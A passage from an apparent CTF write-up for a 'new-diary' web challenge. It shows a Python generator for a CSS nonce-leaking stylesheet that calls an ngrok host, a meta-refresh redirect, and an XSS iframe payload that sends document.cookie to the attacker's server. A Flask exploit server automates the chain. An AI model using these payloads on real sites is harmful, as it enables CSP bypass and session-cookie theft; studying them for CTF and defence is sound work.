+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>new_substr</span><span class=p>)):</span>
+</span></span><span class=line><span class=cl>        <span class=n>start_i</span> <span class=o>=</span> <span class=n>new_substr</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>:</span><span class=mi>2</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=n>left</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>new_substr</span><span class=p>)):</span>
+</span></span><span class=line><span class=cl>            <span class=n>end_j</span> <span class=o>=</span> <span class=n>new_substr</span><span class=p>[</span><span class=n>j</span><span class=p>][</span><span class=o>-</span><span class=mi>2</span><span class=p>:]</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>i</span> <span class=o>!=</span> <span class=n>j</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>start_i</span> <span class=o>==</span> <span class=n>end_j</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=n>left</span> <span class=o>=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>                    <span class=k>break</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>left</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=c1># beginning</span>
+</span></span><span class=line><span class=cl>            <span class=n>remove_i</span> <span class=o>=</span> <span class=n>i</span>
+</span></span><span class=line><span class=cl>            <span class=n>nonce</span> <span class=o>=</span> <span class=n>new_substr</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>nonce</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;no beginning - aborting&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>nonce</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>32</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>new_substr</span> <span class=o>=</span> <span class=n>new_substr</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=n>remove_i</span><span class=p>]</span> <span class=o>+</span> <span class=n>new_substr</span><span class=p>[</span><span class=n>remove_i</span><span class=o>+</span><span class=mi>1</span><span class=p>:]</span>
+</span></span><span class=line><span class=cl>        <span class=c1># print(&#34;new substr: &#34; + str(new_substr))</span>
+</span></span><span class=line><span class=cl>        <span class=n>found</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>new_substr</span><span class=p>)):</span>
+</span></span><span class=line><span class=cl>            <span class=n>start_i</span> <span class=o>=</span> <span class=n>new_substr</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>:</span><span class=mi>2</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>nonce</span><span class=p>[</span><span class=o>-</span><span class=mi>2</span><span class=p>:]</span> <span class=o>==</span> <span class=n>start_i</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                <span class=c1># print(&#34;found: &#34; + start_i)</span>
+</span></span><span class=line><span class=cl>                <span class=n>found</span> <span class=o>+=</span> <span class=p>[</span><span class=n>i</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>found</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=c1># start over from latest backup</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>backup</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                <span class=n>nonce</span> <span class=o>=</span> <span class=n>backup</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>                <span class=n>found</span> <span class=o>=</span> <span class=n>backup</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>                <span class=n>new_substr</span> <span class=o>=</span> <span class=n>backup</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>][</span><span class=mi>2</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>                <span class=n>backup</span> <span class=o>=</span> <span class=n>backup</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;no backup - aborting&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=k>break</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>found</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>found</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>1</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;found more than one: &#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>found</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>                <span class=n>backup</span> <span class=o>+=</span> <span class=p>[[</span><span class=n>nonce</span><span class=p>,</span> <span class=n>found</span><span class=p>[</span><span class=mi>1</span><span class=p>:],</span> <span class=n>new_substr</span><span class=p>]]</span>
+</span></span><span class=line><span class=cl>            <span class=n>remove_i</span> <span class=o>=</span> <span class=n>found</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>            <span class=n>nonce</span> <span class=o>+=</span> <span class=n>new_substr</span><span class=p>[</span><span class=n>remove_i</span><span class=p>][</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1># input(&#34;nonce: &#34; + nonce)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>nonce</span>
+</span></span></code></pre></div><p>We noticed that the tab crashes while loading that css, but the requests are sent to our server anyway.</p><h2 id=sources><a class=full-clickable-heading href=#sources>Sources</a></h2><h3 id=css-exploit><a class=full-clickable-heading href=#css-exploit>CSS exploit</a></h3><p>This is the script used in order to generate the CSS file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>import</span> <span class=nn>itertools</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>charset</span> <span class=o>=</span> <span class=s2>&#34;abcdefghijklmnopqrstuvwxyz0123456789&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>perms</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>,</span> <span class=n>itertools</span><span class=o>.</span><span class=n>product</span><span class=p>(</span><span class=n>charset</span><span class=p>,</span> <span class=n>repeat</span><span class=o>=</span><span class=mi>3</span><span class=p>)))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;leak.css&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>perms</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;&#34;&#34;:has(script[nonce*=&#34;</span><span class=si>{</span><span class=n>x</span><span class=si>}</span><span class=s2>&#34;])</span><span class=se>{{</span><span class=s2>--tosend-</span><span class=si>{</span><span class=n>x</span><span class=si>}</span><span class=s2>: url(https://25de-37-160-34-111.ngrok-free.app/?x=</span><span class=si>{</span><span class=n>x</span><span class=si>}</span><span class=s2>);</span><span class=se>}}</span><span class=s2>&#34;&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;loading&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>perms</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>+=</span> <span class=sa>f</span><span class=s2>&#34;var(--tosend-</span><span class=si>{</span><span class=n>x</span><span class=si>}</span><span class=s2>, none),&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;done&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;writing&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>((</span><span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>input{
+</span></span></span><span class=line><span class=cl><span class=s2>background: </span><span class=si>%s</span><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>}
+</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span> <span class=o>%</span> <span class=n>data</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]))</span>
+</span></span></code></pre></div><h3 id=first-note-id-0><a class=full-clickable-heading href=#first-note-id-0>First note (ID 0)</a></h3><p>Meta tag redirect</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>meta</span> <span class=na>http-equiv</span><span class=o>=</span><span class=s>&#34;refresh&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;0.0;url=https://25de-37-160-34-111.ngrok-free.app/&#34;</span><span class=p>&gt;</span>
+</span></span></code></pre></div><h3 id=second-note-id-1><a class=full-clickable-heading href=#second-note-id-1>Second Note (ID 1)</a></h3><p>Nonce leak</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>link</span> <span class=na>rel</span><span class=o>=</span><span class=s>&#34;stylesheet&#34;</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;https://unpkg.com/alemmi@x.x.x/leak.css&#34;</span><span class=p>&gt;&lt;</span><span class=nt>input</span> <span class=p>/&gt;</span>
+</span></span></code></pre></div><h3 id=third-note-id-2><a class=full-clickable-heading href=#third-note-id-2>Third Note (ID 2)</a></h3><p>XSS</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>name</span><span class=o>=</span><span class=s>asdasd</span> <span class=na>srcdoc</span><span class=o>=</span><span class=s>&#39;&lt;script nonce=&#34;{nonce}&#34;&gt;fetch(&#34;{ngrok_url}/flag?flag=&#34;+encodeURI(document.cookie))&lt;/script&gt;&#39;</span><span class=p>&gt;&lt;/</span><span class=nt>iframe</span><span class=p>&gt;</span>
+</span></span></code></pre></div><h3 id=final-exploit><a class=full-clickable-heading href=#final-exploit>Final exploit</a></h3><p>Just go to <code>/exploit</code> and everything will be automatically done. Obviously, you need to open a ngrok http tunnel to a port, and open the python server to the same port. Furthermore, the leak.css file should have the ngrok url as well.</p><p><code>server.py</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>render_template</span><span class=p>,</span> <span class=n>redirect</span><span class=p>,</span> <span class=n>url_for</span><span class=p>,</span> <span class=n>session</span><span class=p>,</span> <span class=n>make_response</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://new-diary.ctf.0ops.sjtu.cn&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># little random</span>
+</span></span><span class=line><span class=cl><span class=n>user</span> <span class=o>=</span> <span class=s1>&#39;pwn&#39;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1000000</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>ngrok_url</span> <span class=o>=</span> <span class=s1>&#39;https://679d-131-175-28-197.ngrok-free.app/&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>nonce_substr</span> <span class=o>=</span> <span class=nb>set</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>retrieveNonce</span><span class=p>(</span><span class=n>nonce_substr</span><span class=o>=</span><span class=n>nonce_substr</span><span class=p>,</span> <span class=n>force</span><span class=o>=</span><span class=kc>False</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1># find the beginning of the nonce (there is no match for start)</span>
+</span></span><span class=line><span class=cl>    <span class=n>new_substr</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>nonce_substr</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>new_substr</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>30</span> <span class=ow>and</span> <span class=ow>not</span> <span class=n>force</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;different length of new_substr [</span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>new_substr</span><span class=p>)</span><span class=si>}</span><span class=s2>] - aborting&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>    <span class=n>backup</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl>    <span class=n>nonce</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>remove_i</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>new_substr</span><span class=p>)):</span>
+</span></span><span class=line><span class=cl>        <span class=n>start_i</span> <span class=o>=</span> <span class=n>new_substr</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>:</span><span class=mi>2</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=n>left</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>new_substr</span><span class=p>)):</span>
+</span></span><span class=line><span class=cl>            <span class=n>end_j</span> <span class=o>=</span> <span class=n>new_substr</span><span class=p>[</span><span class=n>j</span><span class=p>][</span><span class=o>-</span><span class=mi>2</span><span class=p>:]</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>i</span> <span class=o>!=</span> <span class=n>j</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>start_i</span> <span class=o>==</span> <span class=n>end_j</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=n>left</span> <span class=o>=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>                    <span class=k>break</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>left</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=c1># beginning</span>
+</span></span><span class=line><span class=cl>            <span class=n>remove_i</span> <span class=o>=</span> <span class=n>i</span>
+</span></span><span class=line><span class=cl>            <span class=n>nonce</span> <span class=o>=</span> <span class=n>new_substr</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>nonce</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;no beginning - aborting&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>nonce</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>32</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>new_substr</span> <span class=o>=</span> <span class=n>new_substr</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=n>remove_i</span><span class=p>]</span> <span class=o>+</span> <span class=n>new_substr</span><span class=p>[</span><span class=n>remove_i</span><span class=o>+</span><span class=mi>1</span><span class=p>:]</span>
+</span></span><span class=line><span class=cl>        <span class=c1># print(&#34;new substr: &#34; + str(new_substr))</span>
+</span></span><span class=line><span class=cl>        <span class=n>found</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>new_substr</span><span class=p>)):</span>
+</span></span><span class=line><span class=cl>            <span class=n>start_i</span> <span class=o>=</span> <span class=n>new_substr</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>:</span><span class=mi>2</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>nonce</span><span class=p>[</span><span class=o>-</span><span class=mi>2</span><span class=p>:]</span> <span class=o>==</span> <span class=n>start_i</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                <span class=c1># print(&#34;found: &#34; + start_i)</span>
+</span></span><span class=line><span class=cl>                <span class=n>found</span> <span class=o>+=</span> <span class=p>[</span><span class=n>i</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>found</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=c1># start over from latest backup</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>backup</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                <span class=n>nonce</span> <span class=o>=</span> <span class=n>backup</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>                <span class=n>found</span> <span class=o>=</span> <span class=n>backup</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>                <span class=n>new_substr</span> <span class=o>=</span> <span class=n>backup</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>][</span><span class=mi>2</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>                <span class=n>backup</span> <span class=o>=</span> <span class=n>backup</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;no backup - aborting&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=k>break</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>found</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>found</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>1</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;found more than one: &#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>found</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>                <span class=n>backup</span> <span class=o>+=</span> <span class=p>[[</span><span class=n>nonce</span><span class=p>,</span> <span class=n>found</span><span class=p>[</span><span class=mi>1</span><span class=p>:],</span> <span class=n>new_substr</span><span class=p>]]</span>
+</span></span><span class=line><span class=cl>            <span class=n>remove_i</span> <span class=o>=</span> <span class=n>found</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>            <span class=n>nonce</span> <span class=o>+=</span> <span class=n>new_substr</span><span class=p>[</span><span class=n>remove_i</span><span class=p>][</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1># input(&#34;nonce: &#34; + nonce)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>nonce</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>login</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s1>&#39;/login&#39;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;username&#39;</span><span class=p>:</span> <span class=n>user</span><span class=p>,</span> <span class=s1>&#39;password&#39;</span><span class=p>:</span> <span class=n>user</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>!=</span> <span class=mi>200</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;login failed&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>write_zero_note</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s1>&#39;/write&#39;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;title&#39;</span><span class=p>:</span><span class=s1>&#39;meta&#39;</span><span class=p>,</span> <span class=s1>&#39;content&#39;</span><span class=p>:</span> <span class=sa>f</span><span class=s1>&#39;&lt;meta http-equiv=&#34;refresh&#34; content=&#34;0.0;url=</span><span class=si>{</span><span class=n>ngrok_url</span><span class=si>}</span><span class=s1>&#34;&gt;&#39;</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>    <span class=n>share</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>write_first_note</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s1>&#39;/write&#39;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;title&#39;</span><span class=p>:</span><span class=s1>&#39;linkstylesheet&#39;</span><span class=p>,</span> <span class=s1>&#39;content&#39;</span><span class=p>:</span> <span class=s1>&#39;&lt;link rel=&#34;stylesheet&#34; href=&#34;https://unpkg.com/alemmi@x.x.x/leak.css&#34;&gt;&lt;input /&gt;&#39;</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>    <span class=n>share</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>share</span><span class=p>(</span><span class=n>num</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>/share_diary/</span><span class=si>{</span><span class=n>num</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>create_script_nonce</span><span class=p>(</span><span class=n>nonce</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>script</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;&#34;&#34;&lt;iframe name=asd srcdoc=&#34;&lt;script nonce=</span><span class=si>{</span><span class=n>nonce</span><span class=si>}</span><span class=s2>&gt;top.location=&#39;</span><span class=si>{</span><span class=n>ngrok_url</span><span class=si>}</span><span class=s2>flag?flag=&#39;+encodeURI(document[&#39;cookie&#39;])&lt;/script&gt;&#34;/&gt;&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s1>&#39;/write&#39;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;title&#39;</span><span class=p>:</span><span class=s1>&#39;pwning&#39;</span><span class=p>,</span> <span class=s1>&#39;content&#39;</span><span class=p>:</span> <span class=n>script</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>    <span class=n>share</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>report</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s1>&#39;/report?id=0&amp;username=&#39;</span> <span class=o>+</span> <span class=n>user</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>logout</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s1>&#39;/logout&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/exploit&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exploit</span><span class=p>(</span><span class=n>test</span><span class=o>=</span><span class=kc>False</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>user</span>
